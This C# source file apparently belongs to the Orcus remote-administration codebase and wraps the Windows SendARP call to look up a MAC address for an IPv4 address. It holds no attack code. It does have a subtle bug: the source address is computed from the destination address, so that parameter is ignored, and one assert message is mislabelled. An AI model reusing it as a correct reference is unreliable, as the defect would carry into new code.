using System;
using System.Net;
using System.Net.NetworkInformation;
using Orcus.Administration.Commands.Native;
using Orcus.Shared.Utilities;

namespace Orcus.Administration.Commands.ConnectionInitializer
{
    public static class SendArp
    {
        public static PhysicalAddress GetDestinationMacAddress(IPAddress address)
        {
            return GetDestinationMacAddress(address, NetworkUtilities.GetLanIp());
        }

        public static PhysicalAddress GetDestinationMacAddress(IPAddress address, IPAddress sourceAddress)
        {
            byte[] macAddrBytes = GetDestinationMacAddressBytes(address, sourceAddress);
            var macAddress = new PhysicalAddress(macAddrBytes);

            return macAddress;
        }

        public static byte[] GetDestinationMacAddressBytes(IPAddress address, IPAddress sourceAddress)
        {
            if (address.AddressFamily != System.Net.Sockets.AddressFamily.InterNetwork)
            {
                throw new ArgumentException("Only supports IPv4 Addresses.");
            }

            var addrInt = IpAddressAsInt32(address);
            var srcAddrInt = IpAddressAsInt32(address);

            const int MacAddressLength = 6; // 48bits

            byte[] macAddress = new byte[MacAddressLength];

            Int32 macAddrLen = macAddress.Length;
            Int32 ret = NativeMethods.SendARP(addrInt, srcAddrInt, macAddress, ref macAddrLen);

            if (ret != 0)
                throw new System.ComponentModel.Win32Exception(ret);

            System.Diagnostics.Debug.Assert(macAddrLen == MacAddressLength, "out macAddrLen==4");

            return macAddress;
        }

        private static uint IpAddressAsInt32(IPAddress address)
        {
            byte[] ipAddrBytes = address.GetAddressBytes();
            System.Diagnostics.Debug.Assert(ipAddrBytes.Length == 4, "GetAddressBytes: .Length==4");
            var addrInt = BitConverter.ToUInt32(ipAddrBytes, 0);
            return addrInt;
        }
    }
}